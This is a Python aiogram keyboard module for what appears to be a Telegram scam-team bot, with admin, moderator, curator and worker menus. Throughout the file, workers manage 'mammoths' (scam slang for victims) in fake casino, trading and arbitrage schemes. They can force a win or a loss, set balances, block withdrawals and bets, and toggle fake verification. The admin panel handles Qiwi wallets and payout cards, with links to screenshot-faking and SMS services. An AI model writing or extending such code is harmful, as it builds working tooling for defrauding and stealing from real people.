from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, KeyboardButton, ReplyKeyboardMarkup
from aiogram.utils.callback_data import CallbackData
import config

user_info_callback = CallbackData("user_reg","ref", "status", "username", "user_id")

mainkb = ReplyKeyboardMarkup(
    resize_keyboard=True,
	keyboard = [
		[
            KeyboardButton(text='Профиль 📁')
		],
        [
            KeyboardButton(text='Арбитраж 🌐'),
            KeyboardButton(text='Казино 🎰')
        ],
        [
            KeyboardButton(text='Трейдинг 📈')
        ],
        [
            KeyboardButton(text='О проекте 👨‍💻')
		]
	]
)



prof = InlineKeyboardMarkup(
    inline_keyboard= [
        [
            InlineKeyboardButton(text='Репорт (Жалобы)', callback_data='report_kakoito')
        ],
        [
            InlineKeyboardButton(text='Отрисовка 📝', url='https://t.me/Huge_fan_bot'),
            InlineKeyboardButton(text='Принять SMS 📨', url='https://t.me/Huge_fan_bot')
        ],
        [
            InlineKeyboardButton(text='Скрыть ГЕО 🌍', url='https://t.me/Huge_fan_bot')
        ]
    ]
)

ban_report = InlineKeyboardMarkup(
    inline_keyboard= [
        [
            InlineKeyboardButton(text='Отрисовка 📝', url='https://t.me/Huge_fan_bot'),
            InlineKeyboardButton(text='Принять SMS 📨', url='https://t.me/Huge_fan_bot')
        ],
        [
            InlineKeyboardButton(text='Скрыть ГЕО 🌍', url='https://t.me/Huge_fan_bot')
        ]
    ]
)

bots = InlineKeyboardMarkup(
	inline_keyboard = [
        [
            InlineKeyboardButton(text='Арбитаж бот', callback_data='ArbitrageRassilka')
        ],
        [
            InlineKeyboardButton(text='Воркер бот', callback_data='WorkersRassilka')
        ]
    ]
)

adm = InlineKeyboardMarkup(
	inline_keyboard = [
        [
            InlineKeyboardButton(text='✍️ Ручка', callback_data='pencil')
		],
        [
            InlineKeyboardButton(text='✉️ Рассылка', callback_data='rassilka'),
            InlineKeyboardButton(text='⚙️ Изм. чат', callback_data='SetChatLink')
		],
        [
            InlineKeyboardButton(text='🔒 Заблокировать', callback_data='BlockingUser'),
            InlineKeyboardButton(text='🔓 Разблокировать', callback_data='UnBlockingUser')
		],
        [
            InlineKeyboardButton(text='⚠️ Заблокировать репорт', callback_data='BlockRep'),
            InlineKeyboardButton(text='💠 Разблокировать репорт', callback_data='UnBlockRep')
        ],
        [
            InlineKeyboardButton(text='➡️ Выдать модера', callback_data='GiveModer')
		],
        [
            InlineKeyboardButton(text='➡️ Снять модера', callback_data='PickUpModer')
		],
        [
            InlineKeyboardButton(text='🕵️‍♂️ Выдать куратора', callback_data='GiveKurator')
        ],
        [
            InlineKeyboardButton(text='🕵️‍♂️ Снять куратора', callback_data='PickUpKurator')
        ],
        [
            InlineKeyboardButton(text='❗️Отвязать от куратора', callback_data='otvyzka')
        ],
        [
            InlineKeyboardButton(text='👑 Добавить ТСа', callback_data='dobavilts'),
            InlineKeyboardButton(text='🤬 Снять ТСа', callback_data='snyalts')
        ],
        [
            InlineKeyboardButton(text='➕ Добавить Qiwi', callback_data='QiwiAdd'),
            InlineKeyboardButton(text='➖ Удалить Qiwi', callback_data='QiwiDelete')
		],
        [
            InlineKeyboardButton(text='🥷 Список Qiwi', callback_data='QiwiList')
		],
        [
            InlineKeyboardButton(text='💳 Изменить карту для ПП', callback_data='prymoy')
        ],
        [
            InlineKeyboardButton(text='🥝 Изменить лимит', callback_data='admin:change:limit_link')
        ],
        [
            InlineKeyboardButton(text='О мамонте', callback_data='Mamontenok')
		]
	]
)

ts2 = InlineKeyboardMarkup(
	inline_keyboard = [
        [
            InlineKeyboardButton(text='✍️ Ручка', callback_data='pencil')
		],
        [
            InlineKeyboardButton(text='✉️ Рассылка', callback_data='rassilka'),
            InlineKeyboardButton(text='⚙️ Изм. чат', callback_data='SetChatLink')
		],
        [
            InlineKeyboardButton(text='🔒 Заблокировать', callback_data='BlockingUser'),
            InlineKeyboardButton(text='🔓 Разблокировать', callback_data='UnBlockingUser')
		],
        [
            InlineKeyboardButton(text='⚠️ Заблокировать репорт', callback_data='BlockRep'),
            InlineKeyboardButton(text='💠 Разблокировать репорт', callback_data='UnBlockRep')
        ],
        [
            InlineKeyboardButton(text='➡️ Выдать модера', callback_data='GiveModer')
		],
        [
            InlineKeyboardButton(text='➡️ Снять модера', callback_data='PickUpModer')
		],
        [
            InlineKeyboardButton(text='🕵️‍♂️ Выдать куратора', callback_data='GiveKurator')
        ],
        [
            InlineKeyboardButton(text='🕵️‍♂️ Снять куратора', callback_data='PickUpKurator')
        ],
        [
            InlineKeyboardButton(text='❗️Отвязать от куратора', callback_data='otvyzka')
        ],
        [
            InlineKeyboardButton(text='➕ Добавить Qiwi', callback_data='QiwiAdd'),
            InlineKeyboardButton(text='➖ Удалить Qiwi', callback_data='QiwiDelete')
		],
        [
            InlineKeyboardButton(text='🥷 Список Qiwi', callback_data='QiwiList')
		],
        [
            InlineKeyboardButton(text='💳 Изменить карту для ПП', callback_data='prymoy')
        ],
        [
            InlineKeyboardButton(text='🥝 Изменить лимит', callback_data='admin:change:limit_link')
        ],
        [
            InlineKeyboardButton(text='О мамонте', callback_data='Mamontenok')
		]
	]
)

moder = InlineKeyboardMarkup(
	inline_keyboard = [
        [
            InlineKeyboardButton(text='⚠️ Заблокировать репорт', callback_data='BlockRep2'),
            InlineKeyboardButton(text='💠 Разблокировать репорт', callback_data='UnBlockRep2')
        ],
        [
            InlineKeyboardButton(text='🔒 Заблокировать', callback_data='BlockingUser1'),
            InlineKeyboardButton(text='🔓 Разблокировать', callback_data='UnBlockingUser1')
		],
        [
            InlineKeyboardButton(text='⏰ Изменить статус сети', callback_data='admin:change:status_moder')
        ]
	]
)

kur = InlineKeyboardMarkup(
    inline_keyboard= [
        [
            InlineKeyboardButton(text='⚠️ Заблокировать репорт', callback_data='BlockRep1'),
            InlineKeyboardButton(text='💠 Разблокировать репорт', callback_data='UnBlockRep1')
        ],
        [
            InlineKeyboardButton(text='💸 Привязать воркера', callback_data='privyazka'),
            InlineKeyboardButton(text='🛑 Отвязать воркера', callback_data='otvyzka1')
        ],
        [
            InlineKeyboardButton(text='⏰ Изменить статус сети', callback_data='admin:change:status_kur')
        ]
    ]
)

invite = InlineKeyboardMarkup(
    inline_keyboard= [
        [
            InlineKeyboardButton(text='Добавить куратора', callback_data='dobavilsya')
        ]
    ]
)

project = InlineKeyboardMarkup(
    inline_keyboard =[
        [
            InlineKeyboardButton(text='Реф. система ⛓', callback_data='refkii_sekc'),
            InlineKeyboardButton(text='Правила 📑', callback_data='rules_project')
        ],
        [
            InlineKeyboardButton(text='Кураторы 👨‍🎓', callback_data='kurators'),
            InlineKeyboardButton(text='Инфо-канал❗️', url='https://t.me/Huge_fan_bot')
        ],
        [
            InlineKeyboardButton(text='Чат 💬', url='https://t.me/Huge_fan_bot'),
            InlineKeyboardButton(text='Выплаты 💸', url='https://t.me/Huge_fan_bot')
        ]
    ]
)
prinsogl = InlineKeyboardMarkup(
	inline_keyboard = [
        [
            InlineKeyboardButton(text='✅ Принять правила', callback_data='rules')
		]
	]
)

minnpay = InlineKeyboardMarkup(
	inline_keyboard = [
        [
            InlineKeyboardButton(text='1000', callback_data='mp,1000')
		],
        [
            InlineKeyboardButton(text='2000', callback_data='mp,2000')
		],
        [
            InlineKeyboardButton(text='3500', callback_data='mp,3500')
		],
        [
            InlineKeyboardButton(text='5000', callback_data='mp,5000')
		],
        [
            InlineKeyboardButton(text='10000', callback_data='mp,10000')
		],
	]
)

def admin_change():
    admin_change = InlineKeyboardMarkup(row_width=2)
    buttons = []
    buttons.append(InlineKeyboardButton('🪙 Состояние проекта', callback_data= f'admin:change:status_work'))
    buttons.append(InlineKeyboardButton('🪙 Состояние трейда', callback_data= f'admin:change:status_tr'))
    buttons.append(InlineKeyboardButton('🪙 Состояние казино', callback_data= f'admin:change:status_kaz'))
    buttons.append(InlineKeyboardButton('🪙 Состояние арбитража', callback_data= f'admin:change:status_arb'))
    admin_change.add(*buttons)
    return admin_change

def action_q(id):
	action_q = InlineKeyboardMarkup()
	action_q.add(InlineKeyboardButton('✅ Решено', callback_data = f'q:ok:{id}'))
	action_q.add(InlineKeyboardButton('🚫 Жалоба недостоверна, либо мало информации', callback_data= f'q:deny:{id}'))
	return action_q
    

def set_value(callback):
	set_value = InlineKeyboardMarkup()
	set_value.add(InlineKeyboardButton('Включить', callback_data= f'admin:set:1:{callback}'))
	set_value.add(InlineKeyboardButton('Выключить', callback_data = f'admin:set:0:{callback}'))
	return set_value

links = InlineKeyboardMarkup(
	inline_keyboard = [
        [
            InlineKeyboardButton(text='Канал выплат 💸', url='https://t.me/+hGkvR4e57Y1kNmQ6')
		],
        [
            InlineKeyboardButton(text='Чат воркеров 👨‍💻', url='https://t.me/+To7d6i2FqiE2OGE8')
		],
        [
            InlineKeyboardButton(text='Мануалы 📑', url='https://t.me/+eZhlRe26WFxmYThi')
		],
        [
            InlineKeyboardButton(text='Инфо-канал ℹ️', url='https://t.me/+gu5vFyryprBhZGI1')
        ]
	]
)


def Luck(nuda,dada) -> InlineKeyboardMarkup:
    Lucky = InlineKeyboardButton(text='😎 Победа', callback_data=f'StavkaLuckyman,{nuda},100,{dada}')
    RandomLucky = InlineKeyboardButton(text='😵‍💫 Рандом', callback_data=f'StavkaLuckyman,{nuda},50,{dada}')
    UnLucky = InlineKeyboardButton(text='🛑 Проигрыш', callback_data=f'StavkaLuckyman,{nuda},0,{dada}')
    return InlineKeyboardMarkup().add(Lucky).add(RandomLucky).add(UnLucky)

def arbitrmenu(infa: str) -> InlineKeyboardMarkup:
    mam = InlineKeyboardButton(text='🦣 Мои мамонты', callback_data='mamonts,arbitr')
    pay = InlineKeyboardButton(text=f'💸 Минималка: {infa} RUB', callback_data='minimumpay')
    mail = InlineKeyboardButton(text='💠 Рассылка', callback_data='MailMamonts,arbitrage')
    return InlineKeyboardMarkup().add(mam).add(pay).add(mail)

def casinomenu(infa: str) -> InlineKeyboardMarkup:
    mam = InlineKeyboardButton(text='🦣 Мои мамонты', callback_data='mamonts,casino')
    pay = InlineKeyboardButton(text=f'💸 Минималка: {infa} RUB', callback_data='minimumpay')
    mail = InlineKeyboardButton(text='💠 Рассылка', callback_data='MailMamonts,casino')
    return InlineKeyboardMarkup().add(mam).add(pay).add(mail)

def trademenu(infa: str) -> InlineKeyboardMarkup:
    mam = InlineKeyboardButton(text='🦣 Мои мамонты', callback_data='mamonts,trade')
    pay = InlineKeyboardButton(text=f'💸 Минималка: {infa} RUB', callback_data='minimumpay')
    mail = InlineKeyboardButton(text='💠 Рассылка', callback_data='MailMamonts,trade')
    return InlineKeyboardMarkup().add(mam).add(pay).add(mail)

def mamontarbitrmenu(infa: str) -> InlineKeyboardMarkup:
    udashaa = InlineKeyboardButton(text='🍀 Удача', callback_data=f'Luck,{infa},arbitrage')
    balickdaa = InlineKeyboardButton(text='💸 Баланс', callback_data=f'GiveBalance,{infa},arbitrage')
    ban = InlineKeyboardButton(text='🔒 Забанить', callback_data=f'BlockingUserID,{infa},arbitrage')
    unban = InlineKeyboardButton(text='🔓 Разбанить', callback_data=f'UnBlockingUserID,{infa},arbitrage')
    return InlineKeyboardMarkup().add(udashaa, balickdaa).add(ban, unban)

def mamontcasinomenu(infa: str) -> InlineKeyboardMarkup:
    udashaa = InlineKeyboardButton(text='🍀 Удача', callback_data=f'Luck,{infa},casino')
    balickdaa = InlineKeyboardButton(text='💸 Баланс', callback_data=f'GiveBalance,{infa},casino')
    ban = InlineKeyboardButton(text='🔒 Забанить', callback_data=f'BlockingUserID,{infa},casino')
    unban = InlineKeyboardButton(text='🔓 Разбанить', callback_data=f'UnBlockingUserID,{infa},casino')
    return InlineKeyboardMarkup().add(udashaa, balickdaa).add(ban, unban)

def mamonttrademenu(infa: str) -> InlineKeyboardMarkup:
    udashaa = InlineKeyboardButton(text='🍀 Удача', callback_data=f'Luck,{infa},trade')
    balickdaa = InlineKeyboardButton(text='💸 Баланс', callback_data=f'GiveBalance,{infa},trade')
    ban = InlineKeyboardButton(text='🔒 Забанить', callback_data=f'BlockingUserID,{infa},trade')
    unban = InlineKeyboardButton(text='🔓 Разбанить', callback_data=f'UnBlockingUserID,{infa},trade')
    verif = InlineKeyboardButton(text='✅ Дать верификацию', callback_data=f'VerifkaUserID,{infa},trade')
    unverif = InlineKeyboardButton(text='🛑 Снять верификацию', callback_data=f'UnVerifkaUserID,{infa},trade')
    blockvivod = InlineKeyboardButton(text='🔒 Заблокировать вывод 💸', callback_data=f'BlockVivod,{infa},trade')
    unblockvivod = InlineKeyboardButton(text='🔓 Разблокировать вывод 💸', callback_data=f'UnBlockVivid,{infa},trade')
    blockstavka = InlineKeyboardButton(text='🔒 Заблокировать ставки 📊', callback_data=f'BlockStavka,{infa},trade')
    unblockstavka = InlineKeyboardButton(text='🔓 Разблокировать ставки 📊', callback_data=f'UnBlockStavka,{infa},trade')
    return InlineKeyboardMarkup().add(udashaa, balickdaa).add(ban, unban).add(verif, unverif).add(blockvivod, unblockvivod).add(blockstavka, unblockstavka)

def admin_pick(username, user_id, ref):
    print(username,user_id,ref)
    accept = InlineKeyboardButton(text='Подтвердить', callback_data=user_info_callback.new(ref = ref,status=1, username=username,user_id=user_id))
    decline = InlineKeyboardButton(text='Отклонить', callback_data=user_info_callback.new(ref = ref,status=0, username=username,user_id=user_id ))
    return InlineKeyboardMarkup().add(accept, decline)